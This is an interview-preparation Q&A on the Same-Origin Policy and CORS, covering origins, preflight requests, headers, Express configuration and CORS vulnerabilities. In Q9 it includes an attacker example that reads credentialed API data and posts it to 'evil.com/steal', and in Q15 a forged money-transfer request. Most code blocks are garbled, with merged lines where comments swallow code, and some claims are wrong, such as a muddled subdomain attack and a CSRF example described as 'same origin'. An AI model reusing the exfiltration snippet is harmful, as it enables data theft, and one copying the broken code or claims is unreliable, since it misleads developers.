# CORS and Same-Origin Policy Interview Questions & Answers

---

## Fundamental Questions

### Q1: What is the Same-Origin Policy (SOP) and why does it exist?

**Answer:**
The Same-Origin Policy is a **browser security mechanism** that restricts how documents or scripts loaded from one origin can interact with resources from another origin.

**An origin is defined by:**
- **Scheme (Protocol)**: `http://` or `https://`
- **Host (Domain)**: `example.com`
- **Port**: `80` (HTTP) or `443` (HTTPS) - default ports are implicit

**Why it exists:**
1. **Prevents XSS attacks** - Malicious scripts cannot access data from other origins
2. **Prevents cookie theft** - Cookies are origin-specific
3. **Protects user privacy** - Prevents unauthorized data access
4. **Security isolation** - Websites cannot interfere with each other

**What it restricts:**
- JavaScript access to DOM from different origins
- AJAX/Fetch requests to different origins
- Cookie access from different origins
- LocalStorage/SessionStorage access from different origins

**What it does NOT restrict:**
- Embedding resources (images, scripts, stylesheets, iframes)
- Form submissions to different origins
- Redirects to different origins

**Example:**

```jsx
// Same origin - ALLOWED// https://example.com/page1 accessing https://example.com/page2fetch('https://example.com/api/data')
  .then(response => response.json());  // Works// Different origin - BLOCKED// https://example.com accessing https://api.example.comfetch('https://api.example.com/data')
  .then(response => response.json());  // CORS error
```

---

### Q2: What is CORS and how does it relate to SOP?

**Answer:**
CORS (Cross-Origin Resource Sharing) is a mechanism that allows web servers to specify which origins are permitted to access their resources, thereby **relaxing the Same-Origin Policy** in a controlled manner.

**Key relationship:**
- **SOP** = Default security mechanism (restricts cross-origin access)
- **CORS** = Controlled relaxation (allows specific origins)

**How CORS works:**
1. Browser sends request with `Origin` header
2. Server responds with CORS headers (e.g., `Access-Control-Allow-Origin`)
3. Browser checks CORS headers
4. If origin is allowed → Request proceeds
5. If origin is not allowed → Request blocked

**Important:**
- CORS is **browser-enforced**, not server-protected
- Direct requests (curl, Postman) **bypass CORS**
- CORS only affects browser-based requests

**Example:**

```
# Request
GET /api/data HTTP/1.1
Host: api.example.com
Origin: https://example.com

# Response
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://example.com
Content-Type: application/json

{"data": "value"}
```

---

### Q3: What are the components that define an origin?

**Answer:**
An origin is defined by **three components**:

1. **Scheme (Protocol)**: `http://` or `https://`
2. **Host (Domain)**: `example.com`
3. **Port**: `80` (HTTP) or `443` (HTTPS) - default ports are implicit

**Same Origin Examples:**

```
✅ https://example.com/page1
✅ https://example.com/page2
✅ https://example.com:443/api
// All same origin (port 443 is default for HTTPS)
```

**Different Origin Examples:**

```
❌ http://example.com vs https://example.com
   (Different protocol)

❌ example.com vs www.example.com
   (Different host)

❌ https://example.com vs https://example.com:8080
   (Different port)

❌ https://example.com vs https://api.example.com
   (Different subdomain)
```

**Note:**
- `www.google.com` and `google.com` are **different origins** (different hosts)
- `http://google.com` and `https://google.com` are **different origins** (different protocols)

---

### Q4: What is the difference between simple requests and preflight requests?

**Answer:**

**Simple Requests:**
- Sent directly without preflight check
- Must meet specific criteria:
- Method: GET, POST, or HEAD
- Headers: Only simple headers (Accept, Accept-Language, Content-Language)
- Content-Type: `application/x-www-form-urlencoded`, `multipart/form-data`, or `text/plain`

**Preflight Requests:**
- Browser sends OPTIONS request first
- Triggered when:
- Custom headers (e.g., `X-Custom-Header`)
- Non-simple methods (PUT, DELETE, PATCH)
- Content-Type other than simple types (e.g., `application/json`)
- Requests with credentials (in some cases)

**Example Simple Request:**

```jsx
// Simple GET request - no preflightfetch('https://api.example.com/data')
  .then(response => response.json());
```

**Example Preflight Request:**

```jsx
// Triggers preflight (custom header + JSON)fetch('https://api.example.com/data', {
  method: 'POST',  headers: {
    'Content-Type': 'application/json',    'X-Custom-Header': 'value'  },  body: JSON.stringify({key: 'value'})
});// Flow:// 1. Browser sends OPTIONS (preflight)// 2. Server responds with CORS headers// 3. Browser checks response// 4. If allowed → Sends actual POST request// 5. If not allowed → Blocks request
```

---

### Q5: What are the main CORS headers and what do they do?

**Answer:**

**Request Headers (Sent by Browser):**

1. **Origin**
    
    ```
    Origin: https://example.com
    ```
    
    - Automatically set by browser
    - Cannot be modified by JavaScript
    - Indicates the origin of the requesting page
2. **Access-Control-Request-Method**
    
    ```
    Access-Control-Request-Method: POST
    ```
    
    - Used in preflight requests
    - Indicates the HTTP method of the actual request
3. **Access-Control-Request-Headers**
    
    ```
    Access-Control-Request-Headers: X-Custom-Header, Content-Type
    ```
    
    - Used in preflight requests
    - Lists custom headers that will be sent

**Response Headers (Sent by Server):**

1. **Access-Control-Allow-Origin**
    
    ```
    Access-Control-Allow-Origin: https://example.com
    ```
    
    - Most important CORS header
    - Specifies which origin(s) can access the resource
    - Can be specific origin or  (wildcard)
2. **Access-Control-Allow-Methods**
    
    ```
    Access-Control-Allow-Methods: GET, POST, PUT, DELETE
    ```
    
    - Specifies which HTTP methods are allowed
    - Used in preflight responses
3. **Access-Control-Allow-Headers**
    
    ```
    Access-Control-Allow-Headers: Content-Type, Authorization
    ```
    
    - Specifies which request headers are allowed
    - Used in preflight responses
4. **Access-Control-Allow-Credentials**
    
    ```
    Access-Control-Allow-Credentials: true
    ```
    
    - Indicates whether credentials can be sent
    - **Cannot use wildcard () with credentials**
5. **Access-Control-Expose-Headers**
    
    ```
    Access-Control-Expose-Headers: X-Custom-Header
    ```
    
    - Specifies which response headers can be accessed by JavaScript
6. **Access-Control-Max-Age**
    
    ```
    Access-Control-Max-Age: 86400
    ```
    
    - Specifies how long preflight results can be cached (in seconds)

---

## Scenario-Based Questions

### Q6: How would you configure CORS to allow a trusted third-party domain to access your API while ensuring security?

**Answer:**

**Secure Configuration:**

```jsx
const allowedOrigins = [
  'https://trusted-partner.com',  'https://app.trusted-partner.com'];app.use((req, res, next) => {
  const origin = req.headers.origin;  // Validate origin against whitelist  if (allowedOrigins.includes(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);    res.setHeader('Access-Control-Allow-Credentials', 'true');    res.setHeader('Access-Control-Allow-Methods', 'GET, POST');    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');    res.setHeader('Access-Control-Max-Age', '86400');  }
  // Handle preflight  if (req.method === 'OPTIONS') {
    return res.sendStatus(200);  }
  next();});
```

**Key Security Points:**
1. **Whitelist specific origins** - Don’t use wildcard
2. **Validate Origin header** - Don’t blindly reflect it
3. **Limit methods and headers** - Only allow what’s needed
4. **Use credentials carefully** - Only if necessary
5. **Handle preflight properly** - Validate preflight requests

**Alternative (Using cors middleware):**

```jsx
const cors = require('cors');const corsOptions = {
  origin: (origin, callback) => {
    const allowedOrigins = [
      'https://trusted-partner.com',      'https://app.trusted-partner.com'    ];    if (!origin || allowedOrigins.includes(origin)) {
      callback(null, true);    } else {
      callback(new Error('Not allowed by CORS'));    }
  },  credentials: true,  methods: ['GET', 'POST'],  allowedHeaders: ['Content-Type', 'Authorization'],  maxAge: 86400};app.use(cors(corsOptions));
```

---

### Q7: A user reports that their application can’t make requests to your API. How do you troubleshoot CORS issues?

**Answer:**

**Troubleshooting Steps:**

1. **Check Browser Console:**
    
    ```jsx
    // Look for CORS errors// "No 'Access-Control-Allow-Origin' header"// "CORS policy blocked"
    ```
    
2. **Check Request Headers:**
    
    ```
    # Verify Origin header is sent
    Origin: https://example.com
    ```
    
3. **Check Response Headers:**
    
    ```
    # Verify CORS headers are present
    Access-Control-Allow-Origin: https://example.com
    Access-Control-Allow-Methods: GET, POST
    ```
    
4. **Test with curl:**
    
    ```bash
    # Test simple requestcurl -H "Origin: https://example.com" \     -v https://api.example.com/data
    # Test preflightcurl -X OPTIONS \     -H "Origin: https://example.com" \     -H "Access-Control-Request-Method: POST" \     -v https://api.example.com/data
    ```
    
5. **Common Issues:**
    - **Missing CORS headers** - Server not sending CORS headers
    - **Origin mismatch** - Origin not in allowed list
    - **Wildcard with credentials** - Invalid combination
    - **Preflight not handled** - OPTIONS request not handled
    - **Method/header not allowed** - Request uses disallowed method/header
6. **Verify Configuration:**
    
    ```jsx
    // Check if origin is in allowed listconsole.log('Request Origin:', req.headers.origin);console.log('Allowed Origins:', allowedOrigins);console.log('Is Allowed:', allowedOrigins.includes(req.headers.origin));
    ```
    
7. **Check Browser DevTools:**
    - Network tab → Check request/response headers
    - Console tab → Check for CORS errors
    - Application tab → Check CORS policy

---

### Q8: Your API needs to support both web and mobile apps. How do you configure CORS?

**Answer:**

**Key Considerations:**
- Web apps: Subject to CORS (browser-enforced)
- Mobile apps: Not subject to CORS (direct HTTP requests)

**Configuration:**

```jsx
const allowedOrigins = [
  'https://webapp.example.com',  'https://admin.example.com'];app.use((req, res, next) => {
  const origin = req.headers.origin;  // CORS only applies to browser requests  // Mobile apps don't send Origin header (or send different one)  if (origin && allowedOrigins.includes(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);    res.setHeader('Access-Control-Allow-Credentials', 'true');    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');  }
  // Mobile apps bypass CORS, so use API keys/tokens for authentication  // Web apps use CORS + cookies/tokens  if (req.method === 'OPTIONS') {
    return res.sendStatus(200);  }
  next();});
```

**Authentication Strategy:**
- **Web apps**: CORS + cookies (with credentials)
- **Mobile apps**: API keys or Bearer tokens (not subject to CORS)

**Alternative Approach:**

```jsx
// Different endpoints for web vs mobileapp.use('/api/web/*', cors(corsOptions));  // CORS enabledapp.use('/api/mobile/*', authenticateMobile);  // API key auth
```

---

### Q9: You discover that your CORS configuration allows any origin. What are the security implications?

**Answer:**

**Vulnerable Configuration:**

```
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

**Security Implications:**

1. **Any website can access your API:**
    
    ```jsx
    // Attacker's website: evil.comfetch('https://api.example.com/sensitive-data', {
      credentials: 'include'})
      .then(response => response.json())
      .then(data => {
        // Steal sensitive data    fetch('https://evil.com/steal', {
          method: 'POST',      body: JSON.stringify(data)
        });  });
    ```
    
2. **Credential exposure:**
    - Cookies sent with requests
    - Authentication tokens exposed
    - Session hijacking possible
3. **Data leakage:**
    - Sensitive user data accessible
    - API responses exposed
    - Business logic revealed
4. **CSRF attacks:**
    - Easier to perform CSRF attacks
    - Can bypass some CSRF protections

**Note:** Browsers should reject `Access-Control-Allow-Origin: *` with credentials, but:
- Some misconfigurations may still work
- Direct requests (not browser) bypass this
- Other vulnerabilities may exist

**Fix:**

```jsx
// Use specific originsconst allowedOrigins = [
  'https://example.com',  'https://app.example.com'];app.use((req, res, next) => {
  const origin = req.headers.origin;  if (allowedOrigins.includes(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);    res.setHeader('Access-Control-Allow-Credentials', 'true');  }
  next();});
```

---

### Q10: How do you handle CORS for a development environment vs production?

**Answer:**

**Configuration:**

```jsx
const isDevelopment = process.env.NODE_ENV === 'development';const corsOptions = {
  origin: (origin, callback) => {
    if (isDevelopment) {
      // Development: Allow localhost      if (!origin || origin.startsWith('http://localhost') || origin.startsWith('http://127.0.0.1')) {
        callback(null, true);      } else {
        callback(new Error('Not allowed in development'));      }
    } else {
      // Production: Strict origin list      const allowedOrigins = [
        'https://example.com',        'https://app.example.com'      ];      if (allowedOrigins.includes(origin)) {
        callback(null, true);      } else {
        callback(new Error('Not allowed by CORS'));      }
    }
  },  credentials: true,  methods: ['GET', 'POST', 'PUT', 'DELETE'],  allowedHeaders: ['Content-Type', 'Authorization']
};app.use(cors(corsOptions));
```

**Alternative (Environment-based):**

```jsx
const corsConfig = {
  development: {
    origin: ['http://localhost:3000', 'http://localhost:3001'],    credentials: true  },  production: {
    origin: ['https://example.com', 'https://app.example.com'],    credentials: true  }
};const env = process.env.NODE_ENV || 'development';app.use(cors(corsConfig[env]));
```

**Best Practices:**
- Use environment variables for configuration
- Separate dev/prod CORS settings
- Never use wildcard in production
- Test CORS in both environments

---

## Implementation Questions

### Q11: How do you implement CORS in Node.js/Express?

**Answer:**

**Option 1: Manual Implementation**

```jsx
const express = require('express');const app = express();const allowedOrigins = [
  'https://example.com',  'https://app.example.com'];// CORS middlewareapp.use((req, res, next) => {
  const origin = req.headers.origin;  if (allowedOrigins.includes(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);    res.setHeader('Access-Control-Allow-Credentials', 'true');    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');    res.setHeader('Access-Control-Max-Age', '86400');  }
  // Handle preflight  if (req.method === 'OPTIONS') {
    return res.sendStatus(200);  }
  next();});app.get('/api/data', (req, res) => {
  res.json({ data: 'value' });});
```

**Option 2: Using cors middleware**

```jsx
const express = require('express');const cors = require('cors');const app = express();const corsOptions = {
  origin: (origin, callback) => {
    const allowedOrigins = [
      'https://example.com',      'https://app.example.com'    ];    if (!origin || allowedOrigins.includes(origin)) {
      callback(null, true);    } else {
      callback(new Error('Not allowed by CORS'));    }
  },  credentials: true,  methods: ['GET', 'POST', 'PUT', 'DELETE'],  allowedHeaders: ['Content-Type', 'Authorization'],  maxAge: 86400};app.use(cors(corsOptions));app.get('/api/data', (req, res) => {
  res.json({ data: 'value' });});
```

---

### Q12: How do you test CORS configuration?

**Answer:**

**1. Manual Testing with curl:**

```bash
# Test simple requestcurl -H "Origin: https://example.com" \     -v https://api.example.com/data
# Test preflightcurl -X OPTIONS \     -H "Origin: https://example.com" \     -H "Access-Control-Request-Method: POST" \     -H "Access-Control-Request-Headers: Content-Type" \     -v https://api.example.com/data
# Test with credentialscurl -H "Origin: https://example.com" \     -H "Cookie: sessionId=abc123" \     -v https://api.example.com/data
```

**2. Browser Testing:**

```jsx
// Test in browser consolefetch('https://api.example.com/data', {
  credentials: 'include'})
  .then(response => response.json())
  .then(data => console.log(data))
  .catch(error => console.error('CORS error:', error));
```

**3. Browser DevTools:**
- Network tab → Check request/response headers
- Console tab → Check for CORS errors
- Application tab → Check CORS policy

**4. Automated Tools:**

```bash
# CORScannergit clone https://github.com/chenjj/CORScanner
python CORScanner.py -u https://api.example.com
# Burp Suite# Intercept request → Modify Origin header → Check response# OWASP ZAP# Automated CORS scanning
```

**5. Test Cases:**
- ✅ Allowed origin should work
- ❌ Disallowed origin should be blocked
- ✅ Preflight should be handled
- ❌ Wildcard with credentials should be rejected
- ✅ Credentials should work with specific origin

---

## Security & Vulnerability Questions

### Q13: What is a CORS vulnerability and how can it be exploited?

**Answer:**

**CORS Vulnerability:**
A CORS vulnerability occurs when the server’s CORS configuration is overly permissive or incorrectly validates the Origin header, allowing unauthorized origins to access resources.

**Common Vulnerabilities:**

1. **Origin Reflection Without Validation:**
    
    ```jsx
    // Vulnerable codeapp.use((req, res) => {
      res.setHeader('Access-Control-Allow-Origin', req.headers.origin);  res.setHeader('Access-Control-Allow-Credentials', 'true');});
    ```
    
    **Exploitation:**
    
    ```bash
    # Attacker sends request with malicious origincurl -H "Origin: https://evil.com" https://api.example.com/data
    # Server reflects itAccess-Control-Allow-Origin: https://evil.com
    Access-Control-Allow-Credentials: true
    ```
    
2. **Wildcard with Credentials:**
    
    ```
    Access-Control-Allow-Origin: *
    Access-Control-Allow-Credentials: true
    ```
    
    - Browsers should reject, but misconfigurations may exist
3. **Overly Permissive Origins:**
    
    ```jsx
    // Allows any subdomainif (origin && origin.endsWith('.example.com')) {
      res.setHeader('Access-Control-Allow-Origin', origin);}
    ```
    
    - Attacker can register `evil.example.com`

**Impact:**
- Sensitive data exposure
- Credential theft
- CSRF attacks
- Unauthorized API access

---

### Q14: How do you prevent CORS vulnerabilities?

**Answer:**

**Best Practices:**

1. **Whitelist Specific Origins:**
    
    ```jsx
    const allowedOrigins = [
      'https://example.com',  'https://app.example.com'];if (allowedOrigins.includes(origin)) {
      res.setHeader('Access-Control-Allow-Origin', origin);}
    ```
    
2. **Validate Origin Header:**
    
    ```jsx
    // Don't blindly reflect Origin// Always validate against whitelist
    ```
    
3. **Never Use Wildcard with Credentials:**
    
    ```jsx
    // ❌ WRONGAccess-Control-Allow-Origin: *Access-Control-Allow-Credentials: true// ✅ CORRECTAccess-Control-Allow-Origin: https://example.comAccess-Control-Allow-Credentials: true
    ```
    
4. **Limit Methods and Headers:**
    
    ```jsx
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST');res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    ```
    
5. **Handle Preflight Properly:**
    
    ```jsx
    if (req.method === 'OPTIONS') {
      // Validate preflight request  // Return appropriate CORS headers  return res.sendStatus(200);}
    ```
    
6. **Use Environment Variables:**
    
    ```jsx
    const allowedOrigins = process.env.ALLOWED_ORIGINS.split(',');
    ```
    
7. **Regular Security Audits:**
    - Test CORS configuration
    - Use automated scanning tools
    - Review origin whitelist regularly

---

### Q15: Does CORS protect against CSRF attacks?

**Answer:**

**No, CORS does NOT protect against CSRF attacks.**

**Why:**
- CORS only affects browser-enforced restrictions
- CSRF attacks work by tricking the browser into making requests
- If CORS allows the origin, the browser will send the request
- CORS headers are sent by the server, not validated for CSRF protection

**Example:**

```jsx
// CORS allows https://example.comAccess-Control-Allow-Origin: https://example.comAccess-Control-Allow-Credentials: true// Attacker's website: evil.com// User is logged into example.com// Attacker tricks user into visiting evil.com// CSRF attack still works:fetch('https://example.com/api/transfer', {
  method: 'POST',  credentials: 'include',  body: JSON.stringify({to: 'attacker', amount: 1000})
});// Browser sends request with cookies// CORS allows it (same origin)// CSRF attack succeeds
```

**What Actually Protects Against CSRF:**
- CSRF tokens
- SameSite cookie attribute
- Custom headers (e.g., X-Requested-With)
- Origin validation (but not CORS itself)

**Important:**
- CORS can actually make CSRF easier if misconfigured
- Always use CSRF tokens in addition to CORS
- Use SameSite cookie attribute

---

## Advanced Questions

### Q16: Explain the preflight request flow in detail.

**Answer:**

**Preflight Request Flow:**

1. **Browser detects non-simple request:**
    
    ```jsx
    fetch('https://api.example.com/data', {
      method: 'PUT',  headers: {
        'Content-Type': 'application/json',    'X-Custom-Header': 'value'  },  body: JSON.stringify({key: 'value'})
    });
    ```
    
2. **Browser sends OPTIONS request (preflight):**
    
    ```
    OPTIONS /api/data HTTP/1.1
    Host: api.example.com
    Origin: https://example.com
    Access-Control-Request-Method: PUT
    Access-Control-Request-Headers: Content-Type, X-Custom-Header
    ```
    
3. **Server responds to preflight:**
    
    ```
    HTTP/1.1 200 OK
    Access-Control-Allow-Origin: https://example.com
    Access-Control-Allow-Methods: PUT
    Access-Control-Allow-Headers: Content-Type, X-Custom-Header
    Access-Control-Max-Age: 86400
    ```
    
4. **Browser checks preflight response:**
    - If origin is allowed → Proceed
    - If method is allowed → Proceed
    - If headers are allowed → Proceed
    - If any check fails → Block request
5. **If preflight passes, browser sends actual request:**
    
    ```
    PUT /api/data HTTP/1.1
    Host: api.example.com
    Origin: https://example.com
    Content-Type: application/json
    X-Custom-Header: value
    
    {"key": "value"}
    ```
    
6. **Server responds to actual request:**
    
    ```
    HTTP/1.1 200 OK
    Access-Control-Allow-Origin: https://example.com
    Content-Type: application/json
    
    {"success": true}
    ```
    

**Important:**
- Preflight is **automatic** (browser handles it)
- You don’t need to manually send OPTIONS requests
- Preflight is a **browser optimization** to avoid sending unsafe requests
- Preflight results can be **cached** (Access-Control-Max-Age)

---

### Q17: What happens if you don’t handle preflight requests properly?

**Answer:**

**Consequences:**

1. **Requests Blocked:**
    
    ```jsx
    // Browser sends preflight// Server doesn't respond with CORS headers// Browser blocks the actual request// Error: "CORS policy blocked"
    ```
    
2. **Inconsistent Behavior:**
    - Some requests work (simple requests)
    - Some requests fail (non-simple requests)
    - Difficult to debug
3. **Security Issues:**
    - If preflight is not validated, may allow unauthorized requests
    - Overly permissive preflight responses

**Proper Handling:**

```jsx
// Handle preflightif (req.method === 'OPTIONS') {
  const origin = req.headers.origin;  if (allowedOrigins.includes(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');    res.setHeader('Access-Control-Max-Age', '86400');  }
  return res.sendStatus(200);}
```

---

### Q18: How does CORS work with credentials (cookies, authentication)?

**Answer:**

**Enabling Credentials:**

**Client-side:**

```jsx
fetch('https://api.example.com/data', {
  credentials: 'include'  // Send cookies});
```

**Server-side:**

```
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Credentials: true
```

**Critical Rule:**
- **Cannot use wildcard (`*`) with credentials**
- Must specify exact origin

**Example Flow:**

```
# Request
GET /api/data HTTP/1.1
Host: api.example.com
Origin: https://example.com
Cookie: sessionId=abc123

# Response
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Credentials: true
Set-Cookie: sessionId=xyz789; HttpOnly; Secure; SameSite=None

{"data": "value"}
```

**Important:**
- Credentials include cookies, HTTP authentication, client certificates
- When credentials are used, `Access-Control-Allow-Origin` cannot be `*`
- Server must specify exact origin
- Cookies may need `SameSite=None` for cross-origin requests

---

### Q19: What is the difference between CORS and JSONP?

**Answer:**

**CORS:**
- Modern standard (W3C)
- Supports all HTTP methods (GET, POST, PUT, DELETE, etc.)
- Supports custom headers
- Supports credentials
- Server-controlled (secure)
- Recommended approach

**JSONP:**
- Older technique (workaround)
- Only supports GET requests
- No custom headers
- No credentials
- Client-controlled (less secure)
- Not recommended

**JSONP Example:**

```jsx
// JSONP works by exploiting <script> tags// Scripts are not subject to SOP// Server returns:callback({"data": "value"});// Client:<script src="https://api.example.com/data?callback=handleData"></script><script>function handleData(data) {
  console.log(data);}
</script>
```

**Why CORS is Better:**
- More secure (server-controlled)
- Supports all HTTP methods
- Supports credentials
- Standard approach
- Better error handling

---

### Q20: How do you implement CORS for multiple environments (dev, staging, production)?

**Answer:**

**Configuration:**

```jsx
const corsConfig = {
  development: {
    origin: [
      'http://localhost:3000',      'http://localhost:3001',      'http://127.0.0.1:3000'    ],    credentials: true,    methods: ['GET', 'POST', 'PUT', 'DELETE'],    allowedHeaders: ['Content-Type', 'Authorization']
  },  staging: {
    origin: [
      'https://staging.example.com',      'https://staging-app.example.com'    ],    credentials: true,    methods: ['GET', 'POST', 'PUT', 'DELETE'],    allowedHeaders: ['Content-Type', 'Authorization']
  },  production: {
    origin: [
      'https://example.com',      'https://app.example.com'    ],    credentials: true,    methods: ['GET', 'POST', 'PUT', 'DELETE'],    allowedHeaders: ['Content-Type', 'Authorization']
  }
};const env = process.env.NODE_ENV || 'development';app.use(cors(corsConfig[env]));
```

**Using Environment Variables:**

```jsx
// .env fileALLOWED_ORIGINS_DEV=http://localhost:3000,http://localhost:3001ALLOWED_ORIGINS_STAGING=https://staging.example.comALLOWED_ORIGINS_PROD=https://example.com,https://app.example.com// Codeconst allowedOrigins = process.env[`ALLOWED_ORIGINS_${env.toUpperCase()}`]
  .split(',')
  .map(origin => origin.trim());app.use(cors({
  origin: allowedOrigins,  credentials: true}));
```

---

## Quick Reference Answers

### What is SOP?

**Answer:** Browser security mechanism that restricts cross-origin access.

### What is CORS?

**Answer:** Mechanism that allows servers to specify which origins can access resources.

### Does CORS protect your server?

**Answer:** No, CORS is browser-enforced. Direct requests bypass CORS.

### Can you use wildcard with credentials?

**Answer:** No, browsers will reject `Access-Control-Allow-Origin: *` with credentials.

### What triggers a preflight request?

**Answer:** Custom headers, non-simple methods, non-simple Content-Type, or credentials.

---

## Summary

These interview questions cover:
- ✅ Fundamental concepts (SOP, CORS, origins)
- ✅ Implementation details
- ✅ Security vulnerabilities
- ✅ Best practices
- ✅ Real-world scenarios

**Key takeaway:** CORS is a browser-enforced relaxation of SOP, not a server security feature. Always validate Origin headers and use whitelists, never wildcards with credentials.